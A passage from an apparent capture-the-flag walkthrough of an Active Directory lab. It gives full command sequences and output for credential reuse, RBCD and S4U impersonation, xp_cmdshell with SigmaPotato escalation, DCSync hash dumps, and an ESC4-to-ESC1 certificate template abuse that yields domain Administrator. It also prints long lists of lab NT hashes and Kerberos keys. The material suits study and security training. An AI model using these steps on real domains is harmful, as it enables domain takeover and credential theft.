Enter-pssession -computername dc2.pong.htb -credential $c

<SNIP>
```

We can see that there is the password for `c.carlssen` in clear text.

### Shell as c.carlssen

Let's test these credentials with `nxc`.

```
nxc smb dc2.pong.htb -u 'c.carlssen' -p 'A()DUJ!@414' -d pong.htb -k

[+] pong.htb\c.carlssen:A()DUJ!@414
```

It works ! Let's get a TGT and connect to `dc2.pong.htb`

```
getTGT.py 'pong.htb/c.carlssen:A()DUJ!@414' -dc-ip 192.168.2.2
```

```
evil-winrm -i dc2.pong.htb -r pong.htb

*Evil-WinRM* PS C:\Users\C.Carlssen\Documents>
```

# Abuse Rights of c.carlssen

We can get back to bloodhound to see `c.carlssen` rights.

![c.carlssen ACLs](Images/c.carlssen%20ACLs.png)

```
bloodyAD --host "dc2.pong.htb" -d "pong.htb" \
  -u "c.carlssen" -k --dc-ip 192.168.2.2 \
  get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=pong,DC=htb
permission: WRITE

distinguishedName: CN=C.Carlssen,CN=Users,DC=pong,DC=htb
permission: WRITE

distinguishedName: CN=svc_sql,OU=Service Accounts,DC=pong,DC=htb
permission: WRITE

distinguishedName: CN=svc_print,OU=Service Accounts,DC=pong,DC=htb
permission: WRITE

distinguishedName: CN=svc_ldap,OU=Service Accounts,DC=pong,DC=htb
permission: WRITE
```

We have `GenericWrite` rights on 3 services accounts. The most promising one is the sql because it probably has the privilege `SeImpersonatePrivilege` which should lead to system.

Since LDAPS is not available on `dc2.pong.htb`, we configure RBCD on `svc_sql` so that `Pong_gMSA$` can impersonate any user when authenticating to it.

### Add RBCD

```
bloodyAD --host "dc2.pong.htb" -d "pong.htb" \
  -u "c.carlssen" -k --dc-ip 192.168.2.2 \
  add rbcd svc_sql 'Pong_gMSA$'
```

And we check the value of `msDS-AllowedToActOnBehalfOfOtherIdentity`.

```
bloodyAD --host "dc2.pong.htb" -d "pong.htb" \
  -u "c.carlssen" -k --dc-ip 192.168.2.2 \
  get object svc_sql --attr msDS-AllowedToActOnBehalfOfOtherIdentity
```

We can impersonate `svc_sql` with `Pong_gMSA$`.

### S4u c.adam

![c.adam ACLs](Images/c.adam%20ACLs.png)

`c.adam` is member of `database admins` which means they should have high privileges on `dc2.pong.htb` MSSQL.

We can request a service ticket for `c.adam` (S4U2Self + S4U2Proxy) using `Pong_gMSA$` because of the rbcd we performed earlier.

The attack is called S4u and consists of impersonating another user to retrieve their service ticket.

```
getST.py \
  -spn 'MSSQLSvc/dc2.pong.htb' \
  -impersonate 'c.adam' \
  -k -no-pass \
  -dc-ip 192.168.2.2 \
  'PONG.HTB/Pong_gMSA$'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating c.adam
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in c.adam@MSSQLSvc_dc2.pong.htb@PONG.HTB.ccache
```

# MSSQL

Let's try to connect to the MSSQL instance with the ticket we obtained and see if we have `sysadmin` rights.
### sysadmin validation

```
mssqlclient.py \
  -k -no-pass \
  -dc-ip 192.168.2.2 \
  -target-ip 192.168.2.2 \
  PONG.HTB/c.adam@dc2.pong.htb

SQL (pong\C.Adam  dbo@master)>
```

```
SQL (pong\C.Adam  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');

-
1
```

We are indeed admin on mssql

### Enable xp_cmdshell

Let's enable `xp_cmdshell` to run command on the server.

```
enable_xp_cmdshell
RECONFIGURE
```

Let's check our privileges on the target.

```
SQL (pong\C.Adam  dbo@master)> xp_cmdshell whoami /priv
output
--------------------------------------------------------------------------------
NULL
PRIVILEGES INFORMATION
----------------------
NULL
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We have `SeImpersonatePrivilege` which is a known vulnerability to escalate our privilege.

### Exploit SeImpersonatePrivilege

To exploit this, we need first to create a directory at the root of C:\ on `dc2.pong.htb` with the `evil-winrm` session as `c.carlssen` in order to transfer our files inside which we will be able to call from the mssql session.

```
xp_cmdshell "C:\temp\SigmaPotato.exe --help"
```

Let's use `SigmaPotato.exe` to see if it runs commands as `nt authority\system`.

```
SQL (pong\C.Adam  dbo@master)> xp_cmdshell "C:\temp\SigmaPotato.exe whoami"

output
---------------------------------------------------------

<SNIP>

[+] Process Output:
nt authority\system
```

We are system, let's add `c.carlssen` to the administrators local group.

```
EXEC xp_cmdshell 'C:\temp\SigmaPotato.exe "net localgroup administrators PONG\c.carlssen /add"'
```

Let's check if it worked.

```
net user c.carlssen

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users         *IT Service Admins
The command completed successfully.
```

`c.carlssen` now has Administrator privileges.
### Dump SAM

We can now perform DCSync on `dc2.pong.htb` to retrieve the NT hash and AES256 keys of any user present in the dc.

```
secretsdump.py -k -no-pass -dc-ip 192.168.2.2 \
  PONG.HTB/c.carlssen@dc2.pong.htb -just-dc
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b8ebfb6e9972babf9c01311748261a8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2850c6e9dfa66b220c3e013edbb23580:::
C.Carlssen:1110:aad3b435b51404eeaad3b435b51404ee:e15edce7e905644a94f0c34a0b05104e:::
M.Sun:1111:aad3b435b51404eeaad3b435b51404ee:deccbc15ace5cbf2d902f441783f1115:::
Z.Zhen:1112:aad3b435b51404eeaad3b435b51404ee:df023cb090b82c55e3e18e5fbc7f9bc3:::
A.Pearson:1113:aad3b435b51404eeaad3b435b51404ee:9a9250fa13ba7f4c25e1a5576f5b8a03:::
P.Sanchez:1114:aad3b435b51404eeaad3b435b51404ee:5261d93d06680fc00db5454eff3bcfc0:::
H.Gordon:1115:aad3b435b51404eeaad3b435b51404ee:2dc83c2f510d420be2bf3692e9cb7371:::
P.Reiner:1116:aad3b435b51404eeaad3b435b51404ee:6fa016af828999bda0e26861e00afb31:::
C.Adam:1117:aad3b435b51404eeaad3b435b51404ee:3dbc49f649cd0ed23ecd7d5071bcf00b:::
R.Rupert:1118:aad3b435b51404eeaad3b435b51404ee:8960e808108c23470cea0551d0399e8f:::
svc_sql:1119:aad3b435b51404eeaad3b435b51404ee:9e5de13bde362ad5cc68a49d26301c3b:::
svc_print:1120:aad3b435b51404eeaad3b435b51404ee:e21d90eb3c651f4bfdf6606a4c07ffd5:::
svc_ldap:1121:aad3b435b51404eeaad3b435b51404ee:f49491f9d40172069146a9c907e4d510:::
R.Martinelli:1124:aad3b435b51404eeaad3b435b51404ee:d60fc26a0569b953a5cebd1392232630:::
DC2$:1000:aad3b435b51404eeaad3b435b51404ee:e12246a7e57232eec29791ba3273a5b9:::
Pong_gMSA$:1123:aad3b435b51404eeaad3b435b51404ee:4b85a2a049588810c1267e4018b07a07:::
PING$:1103:aad3b435b51404eeaad3b435b51404ee:9c3d799769aa410c3a8ca5121471808a:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:eb76ed05ee09e812ac2b1328f5b846afeafe69f9a1ba13f94f50ab3d8d524559
Administrator:aes128-cts-hmac-sha1-96:3ca116fdd0d280d751be4efee3eeea7b
Administrator:des-cbc-md5:25ab7c5498ef6df1
krbtgt:aes256-cts-hmac-sha1-96:6282e2af4ca8f5ca935f84d03b486f2e6cc2a9b5c87fb0637a4449a44a8cd5f8
krbtgt:aes128-cts-hmac-sha1-96:f1dc39ca727289c857163fb606b5aa41
krbtgt:des-cbc-md5:6702c7679d2949ef
C.Carlssen:aes256-cts-hmac-sha1-96:1fc4a69c646ad7fe6537eedf7d08e55c93143cf4dd32ec1d27fcd9d007cb78ba
C.Carlssen:aes128-cts-hmac-sha1-96:69ba981c227f43ae62ce4ce3f60389f4
C.Carlssen:des-cbc-md5:648c5e25761973c7
M.Sun:aes256-cts-hmac-sha1-96:653c8cb750f25f9d74c0477616e542d5430cf6bee994b50161cf5d52f3bedfd0
M.Sun:aes128-cts-hmac-sha1-96:8f07ec02fc56a32150d23fd0dbc353a3
M.Sun:des-cbc-md5:105ea16e20762aa2
Z.Zhen:aes256-cts-hmac-sha1-96:208f13a06970095f1edd7942478afd6d34f3b3ccddcae627fdfc00c1b22502b8
Z.Zhen:aes128-cts-hmac-sha1-96:b89193e73905053e95fb2ad3b340cfdb
Z.Zhen:des-cbc-md5:1c8a257962dccdb5
A.Pearson:aes256-cts-hmac-sha1-96:537543f5f783db4a10f4df73e87ec7df9c692df7d970e3ee4be08c76fa53d5e7
A.Pearson:aes128-cts-hmac-sha1-96:a3a9b0fa5a8dab39c2971bab470386a7
A.Pearson:des-cbc-md5:3becd6ae4a26bf89
P.Sanchez:aes256-cts-hmac-sha1-96:12fb2b9eb168304707d6ef260269445089928f2861a8f58e54fea85e9ab5309e
P.Sanchez:aes128-cts-hmac-sha1-96:b0f0baa47311cee88ca2b52b4e8ceb49
P.Sanchez:des-cbc-md5:83dc2cc7fb5dfb57
H.Gordon:aes256-cts-hmac-sha1-96:f540010f801f234d6e1373e5a628184bf658f87f8ac510ad772300d883b300a0
H.Gordon:aes128-cts-hmac-sha1-96:24977a9c20ff0ae29914f4f882d9b0db
H.Gordon:des-cbc-md5:1a7af2c83d46e9cd
P.Reiner:aes256-cts-hmac-sha1-96:558139b55509c8a6fefe5f493f7a316cd6ab23b6eb1770c4a81934f25b6b700d
P.Reiner:aes128-cts-hmac-sha1-96:3e6a72a9be1789fd6ea0b8b9b3306c19
P.Reiner:des-cbc-md5:d5bad657b55132df
C.Adam:aes256-cts-hmac-sha1-96:647d77f0b0b0ebd22689a316339a4242044556182e3fb3c2b7bc5ffc29b1b8c4
C.Adam:aes128-cts-hmac-sha1-96:e550f93fa28e7d7196d98534c1a787ea
C.Adam:des-cbc-md5:806dc84034e6dcef
R.Rupert:aes256-cts-hmac-sha1-96:c0dfecbe5140831b99750a5c68f3ea55e3474d15caa3cc684c9a5c0be8fc4eab
R.Rupert:aes128-cts-hmac-sha1-96:e034d0c375a79fa55f36bad49760fabf
R.Rupert:des-cbc-md5:9dbca10268fddc07
svc_sql:aes256-cts-hmac-sha1-96:04268c99f2fa7c1494eb690f151dbca811659fbb2f91507af68d14ea767299a4
svc_sql:aes128-cts-hmac-sha1-96:e2823bb8675e717c06220991e69ac1b6
svc_sql:des-cbc-md5:1c3bbf5145863858
svc_print:aes256-cts-hmac-sha1-96:f9bd97d0d297630c1b1e85dd2a94a827332e2328d74141a6bafa0aa00aec0544
svc_print:aes128-cts-hmac-sha1-96:9b87341cfde9d6f5832be8fc6718126f
svc_print:des-cbc-md5:765b3434f7e9312c
svc_ldap:aes256-cts-hmac-sha1-96:cfad16d6a69c32b7a78a203485f740d132fb8713d1477d81162eac62ced1bf0b
svc_ldap:aes128-cts-hmac-sha1-96:17b3dbc9341f30adf89d67285bc5cb88
svc_ldap:des-cbc-md5:5792c71945c80bd9
R.Martinelli:aes256-cts-hmac-sha1-96:61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98
R.Martinelli:aes128-cts-hmac-sha1-96:14f94b4b3deaabde802460945a2079e9
R.Martinelli:des-cbc-md5:8c437f1f578f3b3b
DC2$:aes256-cts-hmac-sha1-96:486c88bea5be139e8a271864ac2ff0216d7ccb003b5eb61f2976071490515848
DC2$:aes128-cts-hmac-sha1-96:debc5c93eb20fca6eb01887a5f2104a8
DC2$:des-cbc-md5:16abe5405d2f51ef
Pong_gMSA$:aes256-cts-hmac-sha1-96:9a3d021763ac0f2ceb3b629eddf92fee758a3ba6fce28269a2d35a3e252e539a
Pong_gMSA$:aes128-cts-hmac-sha1-96:c48ae0b9895ebd9e1fe44ce34d3b696e
Pong_gMSA$:des-cbc-md5:2604752a456dfe1c
PING$:aes256-cts-hmac-sha1-96:97d3681ad84c5912ed24cda1cfd7ec0b4aaa8a9075fc0f91a11ec002bb52f812
PING$:aes128-cts-hmac-sha1-96:77f0620796aa9819d9c7c73319adc9eb
PING$:des-cbc-md5:a73d1680029ed54f
[*] Cleaning up...
```

# Privilege Escalation on DC1

Let's get back to bloodhound and check if we can find a way to gain administrators privileges on `dc1.ping.htb`

We notice that `r.martinelli` is a member of `CA MANAGERS` which means he probably has high privileges on certificates.

![r.martinelli ACLs](Images/r.martinelli%20ACLs.png)

Let's request a TGT for that user using his AES256 key we got from the DCSync dump.

```
getTGT.py 'pong.htb/r.martinelli' -aesKey 61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98 -dc-ip 192.168.2.2

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in r.martinelli.ccache
```

### Enum Certificates Templates

The `certipy find` output earlier showed that both HTTP and HTTPS Web Enrollment are disabled on the CA (`Web Enrollment > HTTP > Enabled: False` / `HTTPS > Enabled: False`). This means we cannot rely on the typical `certsrv` web interface for ESC8 or to bypass RPC issues. Our only enrollment paths are direct RPC calls (via `certipy req`) or raw LDAP modifications on the templates themselves, which is why we end up enumerating templates via `ldapsearch` and modifying them via `bloodyAD` rather than using the higher-level `certipy template` workflow.

Let's search for vulnerable certificate templates.

```
ldapsearch \
  -H ldap://dc1.ping.htb \
  -Y GSSAPI \
  -b "CN=Configuration,DC=ping,DC=htb" \
  "(objectClass=pKICertificateTemplate)" \
  cn displayName msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag pKIExtendedKeyUsage 2>/dev/null
```

Let's use a custom script to enumerate the template we can modify.

```
for tpl in TemporaryWinRM SubCA SmartcardAuthentication ClientAuth User; do
    cat > /tmp/test_$tpl.ldif << EOF
dn: CN=$tpl,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
changetype: modify
replace: msPKI-Certificate-Name-Flag
msPKI-Certificate-Name-Flag: 1
EOF
    echo "=== Testing $tpl ==="
    KRB5CCNAME=/workspace/r.martinelli.ccache ldapmodify \
        -H ldap://dc1.ping.htb -Y GSSAPI \
        -f /tmp/test_$tpl.ldif 2>&1 | grep -E "modifying|access|Success"
done
=== Testing TemporaryWinRM ===
ldap_modify: Insufficient access (50)
modifying entry "CN=TemporaryWinRM,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb"
=== Testing SubCA ===
ldap_modify: Insufficient access (50)
modifying entry "CN=SubCA,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb"
=== Testing SmartcardAuthentication ===
modifying entry "CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb"
=== Testing ClientAuth ===
ldap_modify: Insufficient access (50)
modifying entry "CN=ClientAuth,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb"
=== Testing User ===
ldap_modify: Insufficient access (50)
modifying entry "CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb"
```

### Convert ESC4 to ESC1

In order to do that, we first need to obtain a cross-realm `ldap` service ticket.

```
KRB5CCNAME='r.martinelli.ccache' \
kvno ldap/dc1.ping.htb
```
```
klist r.martinelli.ccache 
```

We should see several tickets.

Let's modify `SmartcardAuthentication` now and convert it to ESC1.

```
bloodyAD -d ping.htb --host dc1.ping.htb \
    -u r.martinelli -k ccache=r.martinelli.ccache \
    set object 'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
    msPKI-Certificate-Name-Flag -v 1
```

The value 1 on `msPKI-Certificate-Name-Flag` allows us to request a certificate with a user we provide allowing us to specify the SAN, and therefore impersonate any user.

We grant `GenericAll` to `S-1-5-11` (the well-known SID for **Authenticated Users**) on **SmartcardAuthentication**, which extends the vulnerability to any authenticated user on the domain.

```
bloodyAD --host "dc1.ping.htb" -d "ping.htb" \
  -u "r.martinelli" -k --dc-ip 10.129.26.225 \
  add genericAll \
  'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
  'S-1-5-11'
  
[+] S-1-5-11 has now GenericAll on CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
```

The template is now vulnerable to ESC1.

### Request Certificate for Administrator

Now we can request the certificate using any user in the `authenticated user` group on `dc1.ping.htb`, so let's take the given user `c.roberts` to demonstrate it.

First we need to retrieve the SID of `administrator` with `bloodyAD`.

```
bloodyAD --host "dc1.ping.htb" -d "ping.htb" -u "r.martinelli" -k --dc-ip 10.129.26.225 get object Administrator --attr objectSid

distinguishedName: CN=Administrator,CN=Users,DC=ping,DC=htb
objectSid: S-1-5-21-750635624-2058721901-1932338391-500
```


We need to use the TGT of `c.roberts` before requesting the certificate.

```
export KRB5CCNAME=c.roberts.ccache
```

And we can now request the certificate for the administrator user.

```
certipy req -k -no-pass -target dc1.ping.htb -dc-host dc1.ping.htb -dc-ip 10.129.180.176 -ca ping-DC1-CA -template SmartcardAuthentication -upn 'Administrator@ping.htb' -sid 'S-1-5-21-750635624-2058721901-1932338391-500'

[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@ping.htb'
[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

### Request TGT with Certificate

We can now use the requested certificate to authenticate and retrieve a TGT which will be valid to connect on `dc1.ping.htb` as `administrator`.

```
certipy auth -pfx administrator.pfx -username Administrator -domain ping.htb -dc-ip 10.129.26.225

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@ping.htb'
[*]     SAN URL SID: 'S-1-5-21-750635624-2058721901-1932338391-500'
[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-500'
[*] Using principal: 'administrator@ping.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@ping.htb': aad3b435b51404eeaad3b435b51404ee:63905deb12b527aadfdbc26d3f423eff
```

We can now export the TGT and connect to the target with `evil-winrm` as `administrator`.

```
export KRB5CCNAME=administrator.ccache
```

```
evil-winrm -i dc1.ping.htb -r ping.htb

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Machine rooted !



### Bonus : DCSync on dc1.ping.htb

```
secretsdump.py -k -no-pass -dc-ip 10.129.26.225 \ PING.HTB/administrator@dc1.ping.htb -just-dc

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:63905deb12b527aadfdbc26d3f423eff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d03746770b64696128d1f91b0617aa63:::
M.Russell:2610:aad3b435b51404eeaad3b435b51404ee:f5db5f47f097ab021ee98a30e242ac5e:::
G.Lorents:2611:aad3b435b51404eeaad3b435b51404ee:b455ecc1652c11cd5f66e95f39e71b23:::
Z.Iskam:2612:aad3b435b51404eeaad3b435b51404ee:e50d980fda4d49a973b4327d370f97d1:::
M.Wallace:2613:aad3b435b51404eeaad3b435b51404ee:56d180be2dbf58b6b6409ff3b7882e29:::
P.Paul:2614:aad3b435b51404eeaad3b435b51404ee:5ce178304d579bc1327d5b3d561760ef:::
A.Gordon:2615:aad3b435b51404eeaad3b435b51404ee:48537e9b0cc712176fdb92e813cb5058:::
P.Klain:2616:aad3b435b51404eeaad3b435b51404ee:d85a2e328ee4eac26e76e6f02cb31ba6:::
C.Roberts:2617:aad3b435b51404eeaad3b435b51404ee:2475be69d40e815588a85fd89c7a439d:::
S.Zhoski:2629:aad3b435b51404eeaad3b435b51404ee:361eddef6f02ae10a6313c07937ada22:::
R.Miller:2630:aad3b435b51404eeaad3b435b51404ee:e220860233958f586ba756cb85676286:::
A.Adam:2631:aad3b435b51404eeaad3b435b51404ee:b61722e29b5b22f4a4ad7b74e33c9f71:::
R.Robins:2632:aad3b435b51404eeaad3b435b51404ee:a7020eb3d35dd57f2d17aa1606c2aa40:::
P.Pollek:2633:aad3b435b51404eeaad3b435b51404ee:274a7166a54f86ee23a1ce06d89646e4:::
O.Plinski:2634:aad3b435b51404eeaad3b435b51404ee:88e28600eb3b73747ff18038fde405bd:::
V.Vodomir:2635:aad3b435b51404eeaad3b435b51404ee:82ff8a589f262eb311fd105c241d5c9b:::
D.MacKenzie:2637:aad3b435b51404eeaad3b435b51404ee:fb1027889ab135ce616421bc56464f1f:::
P.Vandeval:2638:aad3b435b51404eeaad3b435b51404ee:9200f377c51934d7a32a8b854bab10b5:::
T.Yang:2639:aad3b435b51404eeaad3b435b51404ee:3ffb8b304717ac77ad5ad50e4e62133e:::
N.Neri:2640:aad3b435b51404eeaad3b435b51404ee:43fa93d482aa6c2024d22e0c42f3845f:::
W.Williams:2641:aad3b435b51404eeaad3b435b51404ee:6f2e39ca814870c04acbeb11496ddead:::
K.Podroski:2642:aad3b435b51404eeaad3b435b51404ee:384ea7cc156e71cc99df84270667bb58:::
G.James:2643:aad3b435b51404eeaad3b435b51404ee:bf7407879e81380e204200430d68efd6:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:238f779053e6dc0de47b2aa15089023e:::
gMSA$:2622:aad3b435b51404eeaad3b435b51404ee:13bb99f6205af6bec63d7fe5b4dc7ef5:::
pong$:2601:aad3b435b51404eeaad3b435b51404ee:98d8af55bbcc9cf8e364bd5a19860487:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:fe77eaeb511e1cf9accc7cae69321ebb80ba330c4f115b34702923f2714d4496
Administrator:aes128-cts-hmac-sha1-96:78f0835c4f0c282b86fb8c48774aaee4
Administrator:des-cbc-md5:4ca2da0df40eb9f2
krbtgt:aes256-cts-hmac-sha1-96:a03b3916abf658bc767fe27655892185cf3ce223ed3425fafa759e7b77e73296
krbtgt:aes128-cts-hmac-sha1-96:3ad16baca3a7f27bcd79a3e0bd496df8
krbtgt:des-cbc-md5:c4f7cd83e3255e89
M.Russell:aes256-cts-hmac-sha1-96:9f7b96c3537b8b5d7475e0867768748931bb53d4f89da2ed6b7cc2a7e17c7932
M.Russell:aes128-cts-hmac-sha1-96:32e04cd9d373c5435a18bf3aa7100b1b
M.Russell:des-cbc-md5:1ceff468a83468fb
G.Lorents:aes256-cts-hmac-sha1-96:8391070b6cf0acf56bc66db54f14745e2089dbc5d0390bd2cffd824a203fbad7
G.Lorents:aes128-cts-hmac-sha1-96:89075f56b9e987a8b5fa92825c719c3c
G.Lorents:des-cbc-md5:9d68348c106831e5
Z.Iskam:aes256-cts-hmac-sha1-96:4f6a9bff5e79bdeae577e854c81b492d3b81d563f3634ffca5b0fb8dcc67773f
Z.Iskam:aes128-cts-hmac-sha1-96:dc6bb8df891d871052f9a3908598fef5
Z.Iskam:des-cbc-md5:76d0794320cb51e3
M.Wallace:aes256-cts-hmac-sha1-96:905043bf92e100b05c9a797b970c938dc980339b071b88a603862bfdfc701eb8
M.Wallace:aes128-cts-hmac-sha1-96:9b7c1c52bbb0659ed47fcdb0724ec659
M.Wallace:des-cbc-md5:dc7c10bf453bcd98
P.Paul:aes256-cts-hmac-sha1-96:1a62f105880eb7fccb92f1c9e2ec49bfe14aad6ac26bee03cd494efcb915648d
P.Paul:aes128-cts-hmac-sha1-96:046f3ecb73c3fc1bf117569e1b708aee
P.Paul:des-cbc-md5:e3c70ddaa43e2c7c
A.Gordon:aes256-cts-hmac-sha1-96:ae39417793a392c16768871139ecc5aa23bc79e9f6f2a0a3ea5e2a3e631cde0b
A.Gordon:aes128-cts-hmac-sha1-96:d3f492c94349547e7a02cd7f0cc8243c
A.Gordon:des-cbc-md5:0407bca7d302546d
P.Klain:aes256-cts-hmac-sha1-96:be46cbb3ced7710db317a61cd1deb69493f0185f67318c157049595968db2fba
P.Klain:aes128-cts-hmac-sha1-96:9c3eb1fc0abbd12d49dc4e08db81cddf
P.Klain:des-cbc-md5:2376e69b19fb1010
C.Roberts:aes256-cts-hmac-sha1-96:1287d579478f88538aaac2163b8d957e7a79c7db2a2068415117b61b830d7a69
C.Roberts:aes128-cts-hmac-sha1-96:16cf180098a467799138d5ff4f150766
C.Roberts:des-cbc-md5:8afe04fb760d2a8f
S.Zhoski:aes256-cts-hmac-sha1-96:525c7eda035297ee847966df8a745e7c3f40bad31862cb0423e7ce0615ecd680
S.Zhoski:aes128-cts-hmac-sha1-96:43a40dcce3b2ff1b578b541dfc12a34c
S.Zhoski:des-cbc-md5:07b620f8ef804f91
R.Miller:aes256-cts-hmac-sha1-96:7353a74aa1e3022f8abc663dcfe84e5b878241f9d4254902e6858f734d8996f9
R.Miller:aes128-cts-hmac-sha1-96:81c1c0c096d6c85e915464535ee563b6
R.Miller:des-cbc-md5:c81392bc5b73202c
A.Adam:aes256-cts-hmac-sha1-96:04091ced1b57eff1ce441d89823e440ce36ed842a4ca25855ef6d3695b746905
A.Adam:aes128-cts-hmac-sha1-96:7e1cbb5f3508de3379c5c29d2a8e22bd
A.Adam:des-cbc-md5:85b075131c9b20e6
R.Robins:aes256-cts-hmac-sha1-96:a8aa4a1a7b516dc5fb66d4cb4b92586592ad9f8c8aeb441d8a726ffecd714197
R.Robins:aes128-cts-hmac-sha1-96:323550366c8412614c528003e4e45644
R.Robins:des-cbc-md5:9e4fcdb37362cdce
P.Pollek:aes256-cts-hmac-sha1-96:80707fa51025e7d6b9b2a78eef80dc8f57adfd7279d318a4a7293120da16cdb9
P.Pollek:aes128-cts-hmac-sha1-96:cc2d981b2b3a330c31e1f714c2c2c40e
P.Pollek:des-cbc-md5:5dae528cf70ba737
O.Plinski:aes256-cts-hmac-sha1-96:68903c7bc5a8befba66d545995ac0528bc4aac83b3dfa6e4b096c10e34fea4bc
O.Plinski:aes128-cts-hmac-sha1-96:440547a950a2985b2067b70ef4877507
O.Plinski:des-cbc-md5:91ad681adf4a5457
V.Vodomir:aes256-cts-hmac-sha1-96:6da880facead97bdcd66c3b25dc21a1aa16f14bf74004bad598a7908104cbe7f
V.Vodomir:aes128-cts-hmac-sha1-96:fb0c7af60798abfccab24a26ccf65305
V.Vodomir:des-cbc-md5:314c329716b0ceda
D.MacKenzie:aes256-cts-hmac-sha1-96:14e32344d295b887832b4cb020645ffded6b9070eccd833768cf48e69164651b
D.MacKenzie:aes128-cts-hmac-sha1-96:4c3502073333b822ef97cb8fb20c654a
D.MacKenzie:des-cbc-md5:9bab3b201a6e894c
P.Vandeval:aes256-cts-hmac-sha1-96:baeb95e5a716c2a418dd0f79ac55a52e6ca98b5a97594c1ba2f847b447effaff
P.Vandeval:aes128-cts-hmac-sha1-96:f8c79571cbb435be621704471b5e87c9
P.Vandeval:des-cbc-md5:0bb3a808e662020b
T.Yang:aes256-cts-hmac-sha1-96:789139902d2f6eac5a429950cb9ee4f3e5878eb92736ef05dba65cfa37a80ebe
T.Yang:aes128-cts-hmac-sha1-96:dc7ec6a270f452aee9c22dec2e08de3c
T.Yang:des-cbc-md5:679ea86bd0b0ef5d
N.Neri:aes256-cts-hmac-sha1-96:75b1fba73117c24d3b2afb22e238ed50b5cecda7c2d2e337cbb5352a14180c13
N.Neri:aes128-cts-hmac-sha1-96:05674c75ed4821b687a29a7f6420192e
N.Neri:des-cbc-md5:8c5ec431e092b3f4
W.Williams:aes256-cts-hmac-sha1-96:37d3b543929d2e8c20848bae188552f0a5ecd8f0f5371eee8ef6a091d5383580
W.Williams:aes128-cts-hmac-sha1-96:ee3f332388b2aa8f7a666675efe3a0c3
W.Williams:des-cbc-md5:70433edaa831c8ae
K.Podroski:aes256-cts-hmac-sha1-96:ab0c6d5bc22fc3ea3edb9bab264c3cce6cad259a75e08346d685e79a6e90b9e8
K.Podroski:aes128-cts-hmac-sha1-96:10d7af9990a4cf479756cc036957b446
K.Podroski:des-cbc-md5:2f049dc7eadcfe5d
G.James:aes256-cts-hmac-sha1-96:6b644e196e1c879240bf20e312368fb4dd7417b4ccda2565416df69939e5cc0a
G.James:aes128-cts-hmac-sha1-96:6bcb5bc52f85bd548fac190b825b62b3
G.James:des-cbc-md5:61d673c70770cd62
DC1$:aes256-cts-hmac-sha1-96:7e1352899cf2401de58146cf17f0a38c1896c0029e89bacd9bf196b9b2987fb0
DC1$:aes128-cts-hmac-sha1-96:4c8a768c8b815e1e705307f83daf0fc7
DC1$:des-cbc-md5:f816a78023cbcd92
gMSA$:aes256-cts-hmac-sha1-96:256a83096bb1f6743b9fedb1616383b6d564c5d5dd85baf6e1d8308522addc55
gMSA$:aes128-cts-hmac-sha1-96:d15d3503df570694d742b0c61e3c0401
gMSA$:des-cbc-md5:9e3b9bc215857a75
pong$:aes256-cts-hmac-sha1-96:31ac84034a64060a216d2c0fbda265892bd41d90dabff122406c0122f7dbf545
